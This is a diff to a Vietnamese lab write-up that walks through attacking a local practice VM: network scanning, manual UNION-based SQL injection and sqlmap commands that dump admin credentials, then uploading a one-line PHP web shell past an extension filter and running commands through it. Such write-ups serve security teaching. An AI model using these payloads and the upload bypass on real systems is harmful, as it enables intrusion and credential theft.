@@ -148,18 +148,116 @@
   
 #### 2. Thực hành lab <a name="tha"></a>
  <br> 2.1 Phương pháp thủ công <a name="kns"></a></br>
-  - B1: Kiểm tra IP của máy đang sử dụng (Linux)
+  - B1: Kiểm tra IP của máy đang sử dụng bằng lệnh `ipconfig` (Linux)
   
       ![ipconfig](https://user-images.githubusercontent.com/101852647/161125758-c703e892-7aa9-45bc-92f3-d9af41a2ed69.png)
      
-  - B2: Sử dụng Netdiscover để quét Giao thức ARP và nhận các thiết bị trên Mạng LAN Chúng ta có thể thấy rằng IP thứ ba là IP mong muốn và IP thứ hai là IP Kali của chúng ta
+  - B2: Sử dụng `netdiscover` để quét Giao thức ARP và nhận các thiết bị trên Mạng LAN Chúng ta có thể thấy rằng IP thứ ba là IP mong muốn và IP thứ hai là IP Kali của chúng ta
   
       ![image](https://user-images.githubusercontent.com/101852647/161126427-18d4dc5c-0098-4f76-bf12-03303e15f04a.png)
       
       ![image](https://user-images.githubusercontent.com/101852647/161126470-1d03c162-2d4e-4752-a58d-4cd00de43dd6.png)
+  - B3: Lệnh `nmap -T4 -p- 192.168.199.129` có nghĩa là quét nhanh hơn trên tất cả các cổng ( 65535 PORTS ). Nmap cho biết chúng ta có hai cổng TCP mở ( 22 / SSH  + 80 / HTTP )
+  
+      ![image](https://user-images.githubusercontent.com/101852647/161127145-1cea6ab4-c338-4b1a-99d5-bb187f37b544.png)
 
+  - B4: Tiếp theo sẽ sử dụng `nmap -Sv -T4 -p- 192.168.199.129` để liệt kê phiên bản của dịch vụ trên 2 cổng 22,80
+  
+      ![image](https://user-images.githubusercontent.com/101852647/161128195-b306e693-c808-4023-979d-40bb3b56480b.png)
+
+  - B5: Đây là trang chính của của trang web cần tấn công
+  
+      ![image](https://user-images.githubusercontent.com/101852647/161128439-3a762db0-85c0-43de-8957-d23a414e36ff.png)
+
+  - B6: Bây giờ chúng ta sẽ điều hướng đến trang admin nhưng thông tin người dùng vẫn chưa xác định
+  
+      ![image](https://user-images.githubusercontent.com/101852647/161129055-e1abe911-399e-45d1-b372-4cb65e6759d5.png)
+
+  - B7: Kiểm tra sqli bằng cách thêm truy vấn `?id=1'` vào url. Khi đó trang chủ trả về `Syntax error` chứng tỏ từ câu lệnh `GET` vừa thêm vào đường dẫn ta có thể tạo câu lệnh truy xuất vào data MySQL nên có thể thấy được trang web có sqli.
+  
+      ![image](https://user-images.githubusercontent.com/101852647/161129497-a58177af-327a-4182-94fc-bddb57926b86.png)
+ 
+  - B8: Khai thác sqli để liệt kê thông tin đăng nhập của quản trị viên. Chúng ta sẽ liệt kê xem là trong database có bao nhiêu cột bằng cách thử câu lệnh `order by` từ 1 đến 4, khi đến cột 5 thì xuất hiện thông báo lỗi nên nhận thấy được trong database sẽ có 4 cột.
+  
+      ![image](https://user-images.githubusercontent.com/101852647/161130618-92043f18-71d1-4bc5-afcf-8f52ddf3185d.png)
+      ![image](https://user-images.githubusercontent.com/101852647/161130655-f75a2084-4786-49b5-ad13-01ee7319a8c0.png)
+
+  - B9: Bây giờ chúng ta sẽ liệt kê thêm và sẽ cố gắng tìm thêm thông tin nhưng trước tiên chúng ta sẽ tìm xem phiên bản của nó là gì bằng câu lệnh `union all select 1,@@version,3,4
+  
+      ![image](https://user-images.githubusercontent.com/101852647/161130933-31b9f0b8-0d70-421a-a5db-16f5ab769511.png)
+ 
+  - B10: Tiếp theo chúng ta sẽ tìm kiếm người dùng và sẽ liệt kê những người dùng bằng câu lệnh `union all select 1,user(),3,4
+  
+      ![image](https://user-images.githubusercontent.com/101852647/161131480-d805a116-30d6-4821-af3c-28cb739353fb.png)
+
+  - B11: Ở bước trên chúng ta đã tìm thấy người dùng nhưng chưa tìm thấy mật khẩu nên bây giờ chúng ta sẽ sử dụng câu lệnh `union all select 1,concat(login,0x3a,password),3,4 FROM users` để tìm thấy được mật khẩu 
+      ![image](https://user-images.githubusercontent.com/101852647/161132020-9dab2f8e-7de9-48c6-abdc-ffb88c2270bc.png)
+
+  - B12: Ở trên chúng ta đã tìm thấy được mật khẩu nhưng nó đang được mã hóa ở dạng là hàm băm nên bây giờ chúng ta sẽ sử dụng công cụ `hash ID` để xem nó là dạng mã hóa gì
+  
+      ![image](https://user-images.githubusercontent.com/101852647/161132434-f30536d4-a13f-4592-a6a1-de1e0bdcd2d1.png)
+
+  - B13: Sau khi biết mật khẩu ở dạng là MD5 thì chúng ta giải mã mật khẩu và nhận được kết quả là: `P4ssw0rd`
+  
  <br> 2.2 Phương pháp sử dụng sqlmap <a name="kns"></a></br>
  
+  - B1: Bây giờ chúng ta sẽ quét bằng ` sqlmap -u http://192.168.199.129:80/cat.php?id=1 --dbs` để có thể quét được database của nạn nhân
+  
+      ![image](https://user-images.githubusercontent.com/101852647/161133072-01f63d6c-57f1-4c3d-a211-b4e22e3f234c.png)
+      
+      ![image](https://user-images.githubusercontent.com/101852647/161133112-3d4c21ff-ba7f-4ca6-bdbc-4fd992c7f07a.png)
+      
+  - B2: Tiếp theo chúng ta sẽ chạy lệnh `sqlmap -u http://192.168.199.129:80/cat.php?id=1 --tables -D photoblog` để tìm kiếm các bảng có trong database
+  
+      ![image](https://user-images.githubusercontent.com/101852647/161133725-28f8b7dc-e619-473d-8c9b-162b2af314be.png)
+
+  - B3: Tiếp theo chúng ta sẽ lấy thông tin người dùng bằng lệnh `sqlmap -u http://192.168.199.129:80/cat.php?id=1 --dump -D photoblog`
+  
+      ![image](https://user-images.githubusercontent.com/101852647/161133194-657d5b8e-6cb3-4ab2-a8c3-b683fab48903.png)
+
+  - B4: Hiển thị kết quả dưới dạng văn bảng
+  
+      ![image](https://user-images.githubusercontent.com/101852647/161134538-08db3fcb-fec1-4920-9008-45761e5e65c7.png)
+
+  - B5: Sau khi có được mật khẩu thì chúng ta sẽ giải mã mật khẩu ở dạng MD5 và được kết quả là: `P4ssw0rd`
+  - B6: Sau khi đăng nhập thành công thì chúng ta sẽ điều hướng đến trang `admin`. Ở đây chúng ta có thể tải hình với tên là `test`.
+        
+      ![image](https://user-images.githubusercontent.com/101852647/161135179-dce96ca7-4433-4f5a-9535-d31744a21b49.png)
+
+  - B7: Hiện thị hình ảnh có trong database để kiểm tra xem là chúng ta có thể truy xuất vào database từ đường dẫn `192.168.199.129/admin/uploads/hacker.png` không
+  
+      ![image](https://user-images.githubusercontent.com/101852647/161135898-fad4460c-e893-4d94-a3b3-62e3aef18494.png)
+
+  - B8: Bây giờ chúng ta sẽ trở về trang `uploads` để kiểm tra xem hình đó nó có trong uploads hay không
+  
+      ![image](https://user-images.githubusercontent.com/101852647/161136223-b86e4f4e-df97-4ede-9474-c4982b7451d9.png)
+  
+  - B9: Tạo một file php để có thể EXECUTE và lấy được cmd của đường dẫn .
+  
+      `<?php system($_GET["cmd"]); ?>`
+      
+  - B10: Bây giờ chúng ta sẽ tải thử file `shell.php`. Tuy nhiên đuôi file php không cho tải lên.
+  
+      ![image](https://user-images.githubusercontent.com/101852647/161137480-4866429e-eeed-4796-b189-9ddf2148f17b.png)
+  
+      ![image](https://user-images.githubusercontent.com/101852647/161137452-12852ad2-7de8-4a16-b1f1-3491fb2b46df.png)
+      
+  - B11: Vì vậy, chúng ta sẽ chỉnh sửa đuôi `php` thành `PHP`.
+  
+      ![image](https://user-images.githubusercontent.com/101852647/161137731-fe2a9ddc-8649-472c-9ae7-77d21c84308e.png)
+
+  - B12: Sau khi chỉnh sửa chúng ta đã tải thành công file `shell.php`
+  
+      ![image](https://user-images.githubusercontent.com/101852647/161137847-7927c9f6-ee2a-420c-8f47-70e786a4764a.png)
+
+  - B13: Bây giờ chúng ta sẽ kiểm tra xem nó đã có trong uploads chưa
+  
+      ![image](https://user-images.githubusercontent.com/101852647/161138056-8a9f8381-ddfa-42e0-9425-dc027aa4e6f1.png)
+
+  - B14: Kiểm tra lại bằng cách gọi đường dẫn `192.168.199.129/admin/uploads/shell.PHP?cmd=whoami;id;uname -a` hiện lên thông báo như hình dưới đây. Chứng tỏ ta có thể sử dụng shell đã upload dưới dạng file php
+  
+  ![image](https://user-images.githubusercontent.com/101852647/161139179-69704e04-efce-47ee-9528-e890c3f9dbc1.png)
+
 #### 3. Tìm hiểu sqli là gì, Xảy ra khi nào, Tác hại, Khắc phục, Dẫn chứng. <a name="ths"></a>
  <br> 3.1 Khái niệm sqli <a name="kns"></a></br>
   - SQL injection là kĩ thuật cho phép các kẻ tấn công chèn và thực thi các lệnh SQL bất hợp pháp (mà người phát triển không lường trước được) bên trong hệ thống, bằng cách lợi dụng các lỗ hổng bảo mật từ dữ liệu nhập vào của các ứng dụng. Qua đó làm lộ thông tin trong cơ sở dữ liệu, tạo ra sự sai lệch hoặc gây ra hư hỏng dữ liệu của hệ thống.
